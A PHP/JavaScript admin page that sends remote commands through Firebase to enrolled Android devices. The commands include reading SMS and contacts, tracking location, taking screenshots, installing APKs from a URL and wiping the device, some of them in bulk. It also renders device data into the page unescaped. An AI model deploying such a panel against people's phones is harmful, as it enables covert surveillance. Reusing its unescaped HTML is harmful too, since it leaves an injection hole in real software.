<?php
session_start();
require_once 'config/firebase.php';
require_once 'includes/auth.php';
require_once 'includes/functions.php';

requireLogin();

$pageTitle = 'Command Center - ERDMT Admin Panel';
include 'includes/header.php';
?>

<div class="container-fluid">
    <div class="row">
        <!-- Sidebar -->
        <nav class="col-md-3 col-lg-2 d-md-block bg-light sidebar">
            <div class="position-sticky pt-3">
                <ul class="nav flex-column">
                    <li class="nav-item">
                        <a class="nav-link" href="index.php">
                            <i class="fas fa-tachometer-alt"></i> Dashboard
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="devices.php">
                            <i class="fas fa-mobile-alt"></i> Devices
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="commands.php">
                            <i class="fas fa-terminal"></i> Commands
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="files.php">
                            <i class="fas fa-folder"></i> File Manager
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="messages.php">
                            <i class="fas fa-comments"></i> Messages
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="settings.php">
                            <i class="fas fa-cog"></i> Settings
                        </a>
                    </li>
                </ul>
            </div>
        </nav>

        <!-- Main content -->
        <main class="col-md-9 ms-sm-auto col-lg-10 px-md-4">
            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                <h1 class="h2">Command Center</h1>
                <div class="btn-toolbar mb-2 mb-md-0">
                    <div class="btn-group me-2">
                        <button type="button" class="btn btn-sm btn-outline-secondary" onclick="loadCommands()">
                            <i class="fas fa-sync-alt"></i> Refresh
                        </button>
                    </div>
                </div>
            </div>

            <!-- Quick Commands -->
            <div class="row mb-4">
                <div class="col-md-8">
                    <div class="card">
                        <div class="card-header">
                            <h5 class="mb-0">Send Command</h5>
                        </div>
                        <div class="card-body">
                            <form id="commandForm">
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="mb-3">
                                            <label for="deviceSelect" class="form-label">Select Device</label>
                                            <select class="form-select" id="deviceSelect" required>
                                                <option value="">Loading devices...</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="mb-3">
                                            <label for="commandSelect" class="form-label">Command</label>
                                            <select class="form-select" id="commandSelect" required onchange="updateCommandParams()">
                                                <option value="">Select a command</option>
                                                <option value="get_location">Get Location</option>
                                                <option value="get_contacts">Get Contacts</option>
                                                <option value="get_sms">Get SMS Messages</option>
                                                <option value="send_sms">Send SMS</option>
                                                <option value="take_screenshot">Take Screenshot</option>
                                                <option value="get_device_info">Get Device Info</option>
                                                <option value="lock_device">Lock Device</option>
                                                <option value="unlock_device">Unlock Device</option>
                                                <option value="play_sound">Play Sound</option>
                                                <option value="vibrate">Vibrate</option>
                                                <option value="change_wallpaper">Change Wallpaper</option>
                                                <option value="install_app">Install App</option>
                                                <option value="uninstall_app">Uninstall App</option>
                                                <option value="wipe_device">Wipe Device</option>
                                            </select>
                                        </div>
                                    </div>
                                </div>
                                
                                <div id="commandParams"></div>
                                
                                <div class="d-grid">
                                    <button type="submit" class="btn btn-primary">
                                        <i class="fas fa-paper-plane"></i> Send Command
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
                
                <div class="col-md-4">
                    <div class="card">
                        <div class="card-header">
                            <h5 class="mb-0">Quick Actions</h5>
                        </div>
                        <div class="card-body">
                            <div class="d-grid gap-2">
                                <button class="btn btn-outline-primary" onclick="sendToAllDevices('get_location')">
                                    <i class="fas fa-map-marker-alt"></i> Get All Locations
                                </button>
                                <button class="btn btn-outline-success" onclick="sendToAllDevices('take_screenshot')">
                                    <i class="fas fa-camera"></i> Screenshot All
                                </button>
                                <button class="btn btn-outline-info" onclick="sendToAllDevices('play_sound', {duration: 10})">
                                    <i class="fas fa-volume-up"></i> Ring All Devices
                                </button>
                                <button class="btn btn-outline-warning" onclick="sendToAllDevices('get_device_info')">
                                    <i class="fas fa-info-circle"></i> Update All Info
                                </button>
                                <button class="btn btn-outline-danger" onclick="emergencyLockAll()">
                                    <i class="fas fa-exclamation-triangle"></i> Emergency Lock All
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Command History -->
            <div class="card">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <h5 class="mb-0">Command History</h5>
                    <div class="btn-group btn-group-sm">
                        <button class="btn btn-outline-secondary" onclick="filterCommands('all')">All</button>
                        <button class="btn btn-outline-warning" onclick="filterCommands('pending')">Pending</button>
                        <button class="btn btn-outline-success" onclick="filterCommands('completed')">Completed</button>
                        <button class="btn btn-outline-danger" onclick="filterCommands('failed')">Failed</button>
                    </div>
                </div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="table table-striped">
                            <thead>
                                <tr>
                                    <th>Time</th>
                                    <th>Device</th>
                                    <th>Command</th>
                                    <th>Parameters</th>
                                    <th>Status</th>
                                    <th>Result</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody id="commandsTableBody">
                                <tr>
                                    <td colspan="7" class="text-center">
                                        <div class="spinner-border" role="status">
                                            <span class="visually-hidden">Loading...</span>
                                        </div>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </main>
    </div>
</div>

<!-- Command Result Modal -->
<div class="modal fade" id="commandResultModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Command Result</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body" id="commandResultContent">
                <!-- Content loaded dynamically -->
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" onclick="downloadResult()">Download</button>
            </div>
        </div>
    </div>
</div>

<script>
// Firebase configuration
const firebaseConfig = {
    apiKey: "<?php echo FIREBASE_API_KEY; ?>",
    authDomain: "<?php echo FIREBASE_PROJECT_ID; ?>.firebaseapp.com",
    databaseURL: "<?php echo FIREBASE_DATABASE_URL; ?>",
    projectId: "<?php echo FIREBASE_PROJECT_ID; ?>",
    storageBucket: "<?php echo FIREBASE_STORAGE_BUCKET; ?>",
    messagingSenderId: "<?php echo FIREBASE_PROJECT_NUMBER; ?>",
    appId: "<?php echo FIREBASE_APP_ID; ?>"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

let devicesData = {};
let commandsData = {};
let currentFilter = 'all';

function loadDevices() {
    database.ref('devices').on('value', (snapshot) => {
        devicesData = snapshot.val() || {};
        updateDeviceSelect();
    });
}

function loadCommands() {
    database.ref('commands').on('value', (snapshot) => {
        commandsData = snapshot.val() || {};
        updateCommandsTable();
    });
}

function updateDeviceSelect() {
    const select = document.getElementById('deviceSelect');
    let html = '<option value="">Select a device</option>';
    
    Object.entries(devicesData).forEach(([deviceId, device]) => {
        const status = getDeviceStatus(device);
        const statusIcon = status.text === 'Online' ? '🟢' : '🔴';
        html += `<option value="${deviceId}">${statusIcon} ${device.name || deviceId}</option>`;
    });
    
    select.innerHTML = html;
}

function updateCommandParams() {
    const command = document.getElementById('commandSelect').value;
    const paramsDiv = document.getElementById('commandParams');
    
    let html = '';
    
    switch (command) {
        case 'get_sms':
            html = `
                <div class="mb-3">
                    <label for="smsLimit" class="form-label">Number of messages to retrieve</label>
                    <input type="number" class="form-control" id="smsLimit" value="50" min="1" max="1000">
                </div>
            `;
            break;
            
        case 'send_sms':
            html = `
                <div class="row">
                    <div class="col-md-6">
                        <div class="mb-3">
                            <label for="smsNumber" class="form-label">Phone Number</label>
                            <input type="tel" class="form-control" id="smsNumber" required>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="mb-3">
                            <label for="smsMessage" class="form-label">Message</label>
                            <textarea class="form-control" id="smsMessage" rows="3" required></textarea>
                        </div>
                    </div>
                </div>
            `;
            break;
            
        case 'unlock_device':
            html = `
                <div class="mb-3">
                    <label for="unlockPassword" class="form-label">Unlock Password/PIN</label>
                    <input type="password" class="form-control" id="unlockPassword" required>
                </div>
            `;
            break;
            
        case 'play_sound':
        case 'vibrate':
            html = `
                <div class="mb-3">
                    <label for="duration" class="form-label">Duration (seconds)</label>
                    <input type="number" class="form-control" id="duration" value="10" min="1" max="60">
                </div>
            `;
            break;
            
        case 'change_wallpaper':
            html = `
                <div class="mb-3">
                    <label for="wallpaperUrl" class="form-label">Image URL</label>
                    <input type="url" class="form-control" id="wallpaperUrl" required>
                </div>
            `;
            break;
            
        case 'install_app':
            html = `
                <div class="mb-3">
                    <label for="appUrl" class="form-label">APK Download URL</label>
                    <input type="url" class="form-control" id="appUrl" required>
                </div>
            `;
            break;
            
        case 'uninstall_app':
            html = `
                <div class="mb-3">
                    <label for="packageName" class="form-label">Package Name</label>
                    <input type="text" class="form-control" id="packageName" placeholder="com.example.app" required>
                </div>
            `;
            break;
            
        case 'wipe_device':
            html = `
                <div class="alert alert-danger">
                    <i class="fas fa-exclamation-triangle"></i>
                    <strong>Warning:</strong> This will completely wipe the device. This action cannot be undone.
                </div>
                <div class="form-check">
                    <input class="form-check-input" type="checkbox" id="wipeConfirm" required>
                    <label class="form-check-label" for="wipeConfirm">
                        I understand this will permanently delete all data on the device
                    </label>
                </div>
            `;
            break;
    }
    
    paramsDiv.innerHTML = html;
}

function getCommandParams() {
    const command = document.getElementById('commandSelect').value;
    let params = {};
    
    switch (command) {
        case 'get_sms':
            params.limit = parseInt(document.getElementById('smsLimit').value);
            break;
        case 'send_sms':
            params.number = document.getElementById('smsNumber').value;
            params.message = document.getElementById('smsMessage').value;
            break;
        case 'unlock_device':
            params.password = document.getElementById('unlockPassword').value;
            break;
        case 'play_sound':
        case 'vibrate':
            params.duration = parseInt(document.getElementById('duration').value);
            break;
        case 'change_wallpaper':
            params.image_url = document.getElementById('wallpaperUrl').value;
            break;
        case 'install_app':
            params.url = document.getElementById('appUrl').value;
            break;
        case 'uninstall_app':
            params.package = document.getElementById('packageName').value;
            break;
        case 'wipe_device':
            params.confirm = document.getElementById('wipeConfirm').checked;
            break;
    }
    
    return params;
}

function sendCommand() {
    const deviceId = document.getElementById('deviceSelect').value;
    const command = document.getElementById('commandSelect').value;
    const params = getCommandParams();
    
    if (!deviceId || !command) {
        showAlert('Please select a device and command', 'danger');
        return;
    }
    
    if (command === 'wipe_device' && !params.confirm) {
        showAlert('Please confirm the device wipe operation', 'danger');
        return;
    }
    
    showLoading();
    
    const commandData = {
        command: command,
        params: params,
        timestamp: Date.now(),
        status: 'pending',
        admin_id: '<?php echo $_SESSION['admin_user_id'] ?? 'unknown'; ?>',
        admin_email: '<?php echo $_SESSION['admin_email'] ?? 'unknown'; ?>'
    };
    
    const commandId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    database.ref(`commands/${deviceId}/${commandId}`).set(commandData)
        .then(() => {
            hideLoading();
            showAlert(`Command '${command}' sent successfully`, 'success');
            document.getElementById('commandForm').reset();
            document.getElementById('commandParams').innerHTML = '';
        })
        .catch(error => {
            hideLoading();
            showAlert('Failed to send command: ' + error.message, 'danger');
        });
}

function sendToAllDevices(command, params = {}) {
    const onlineDevices = Object.entries(devicesData).filter(([id, device]) => 
        getDeviceStatus(device).text === 'Online'
    );
    
    if (onlineDevices.length === 0) {
        showAlert('No online devices found', 'warning');
        return;
    }
    
    const confirmMessage = `Send '${command}' to ${onlineDevices.length} online device(s)?`;
    if (!confirm(confirmMessage)) return;
    
    showLoading();
    
    const promises = onlineDevices.map(([deviceId]) => {
        const commandData = {
            command: command,
            params: params,
            timestamp: Date.now(),
            status: 'pending',
            admin_id: '<?php echo $_SESSION['admin_user_id'] ?? 'unknown'; ?>',
            admin_email: '<?php echo $_SESSION['admin_email'] ?? 'unknown'; ?>'
        };
        
        const commandId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        return database.ref(`commands/${deviceId}/${commandId}`).set(commandData);
    });
    
    Promise.all(promises)
        .then(() => {
            hideLoading();
            showAlert(`Command sent to ${onlineDevices.length} devices`, 'success');
        })
        .catch(error => {
            hideLoading();
            showAlert('Failed to send commands: ' + error.message, 'danger');
        });
}

function emergencyLockAll() {
    const message = 'EMERGENCY: Lock all devices immediately?\n\nThis will lock ALL registered devices regardless of their online status.';
    if (!confirm(message)) return;
    
    showLoading();
    
    const promises = Object.keys(devicesData).map(deviceId => {
        const commandData = {
            command: 'lock_device',
            params: {},
            timestamp: Date.now(),
            status: 'pending',
            priority: 'high',
            admin_id: '<?php echo $_SESSION['admin_user_id'] ?? 'unknown'; ?>',
            admin_email: '<?php echo $_SESSION['admin_email'] ?? 'unknown'; ?>'
        };
        
        const commandId = 'emergency_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        return database.ref(`commands/${deviceId}/${commandId}`).set(commandData);
    });
    
    Promise.all(promises)
        .then(() => {
            hideLoading();
            showAlert(`Emergency lock sent to ${Object.keys(devicesData).length} devices`, 'warning');
        })
        .catch(error => {
            hideLoading();
            showAlert('Failed to send emergency lock: ' + error.message, 'danger');
        });
}

function updateCommandsTable() {
    const tbody = document.getElementById('commandsTableBody');
    let html = '';
    let allCommands = [];
    
    // Flatten commands from all devices
    Object.entries(commandsData).forEach(([deviceId, commands]) => {
        Object.entries(commands || {}).forEach(([commandId, command]) => {
            allCommands.push({
                ...command,
                deviceId: deviceId,
                commandId: commandId,
                deviceName: devicesData[deviceId]?.name || deviceId
            });
        });
    });
    
    // Sort by timestamp (newest first)
    allCommands.sort((a, b) => b.timestamp - a.timestamp);
    
    // Filter commands
    if (currentFilter !== 'all') {
        allCommands = allCommands.filter(cmd => cmd.status === currentFilter);
    }
    
    // Limit to last 100 commands for performance
    allCommands = allCommands.slice(0, 100);
    
    if (allCommands.length === 0) {
        html = '<tr><td colspan="7" class="text-center text-muted">No commands found</td></tr>';
    } else {
        allCommands.forEach(command => {
            const statusBadge = getStatusBadge(command.status);
            const params = command.params ? JSON.stringify(command.params) : '-';
            const result = command.result ? 'Available' : '-';
            
            html += `
                <tr>
                    <td>${formatTimestamp(command.timestamp)}</td>
                    <td>${command.deviceName}</td>
                    <td><code>${command.command}</code></td>
                    <td><small>${params}</small></td>
                    <td>${statusBadge}</td>
                    <td>${result}</td>
                    <td>
                        <div class="btn-group btn-group-sm">
                            ${command.result ? 
                                `<button class="btn btn-outline-primary" onclick="showCommandResult('${command.deviceId}', '${command.commandId}')" title="View Result">
                                    <i class="fas fa-eye"></i>
                                </button>` : ''
                            }
                            <button class="btn btn-outline-secondary" onclick="retryCommand('${command.deviceId}', '${command.commandId}')" title="Retry">
                                <i class="fas fa-redo"></i>
                            </button>
                        </div>
                    </td>
                </tr>
            `;
        });
    }
    
    tbody.innerHTML = html;
}

function getStatusBadge(status) {
    const badges = {
        'pending': '<span class="badge bg-warning">Pending</span>',
        'executing': '<span class="badge bg-info">Executing</span>',
        'completed': '<span class="badge bg-success">Completed</span>',
        'failed': '<span class="badge bg-danger">Failed</span>',
        'timeout': '<span class="badge bg-secondary">Timeout</span>'
    };
    
    return badges[status] || '<span class="badge bg-secondary">Unknown</span>';
}

function filterCommands(filter) {
    currentFilter = filter;
    updateCommandsTable();
    
    // Update active button
    document.querySelectorAll('.btn-group .btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
}

function showCommandResult(deviceId, commandId) {
    const command = commandsData[deviceId]?.[commandId];
    if (!command || !command.result) return;
    
    let content = `
        <div class="mb-3">
            <h6>Command Details</h6>
            <table class="table table-sm">
                <tr><td><strong>Command:</strong></td><td><code>${command.command}</code></td></tr>
                <tr><td><strong>Device:</strong></td><td>${devicesData[deviceId]?.name || deviceId}</td></tr>
                <tr><td><strong>Executed:</strong></td><td>${formatTimestamp(command.timestamp)}</td></tr>
                <tr><td><strong>Status:</strong></td><td>${getStatusBadge(command.status)}</td></tr>
            </table>
        </div>
        <div class="mb-3">
            <h6>Result</h6>
            <pre class="bg-light p-3 rounded">${JSON.stringify(command.result, null, 2)}</pre>
        </div>
    `;
    
    document.getElementById('commandResultContent').innerHTML = content;
    new bootstrap.Modal(document.getElementById('commandResultModal')).show();
}

function retryCommand(deviceId, commandId) {
    const command = commandsData[deviceId]?.[commandId];
    if (!command) return;
    
    const newCommandData = {
        ...command,
        timestamp: Date.now(),
        status: 'pending',
        retry_of: commandId
    };
    
    const newCommandId = 'retry_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    database.ref(`commands/${deviceId}/${newCommandId}`).set(newCommandData)
        .then(() => {
            showAlert('Command retry sent successfully', 'success');
        })
        .catch(error => {
            showAlert('Failed to retry command: ' + error.message, 'danger');
        });
}

function getDeviceStatus(device) {
    if (!device.lastSeen) return { text: 'Never Connected', color: 'secondary' };
    
    const now = Date.now();
    const lastSeen = device.lastSeen;
    const timeDiff = now - lastSeen;
    
    if (timeDiff < 300000) { // 5 minutes
        return { text: 'Online', color: 'success' };
    } else if (timeDiff < 3600000) { // 1 hour
        return { text: 'Recently Active', color: 'warning' };
    } else {
        return { text: 'Offline', color: 'danger' };
    }
}

// Form submission
document.getElementById('commandForm').addEventListener('submit', function(e) {
    e.preventDefault();
    sendCommand();
});

// Load data on page load
document.addEventListener('DOMContentLoaded', function() {
    loadDevices();
    loadCommands();
});

// Auto-refresh every 15 seconds
startAutoRefresh(() => {
    loadCommands();
}, 15000);
</script>

<?php include 'includes/footer.php'; ?>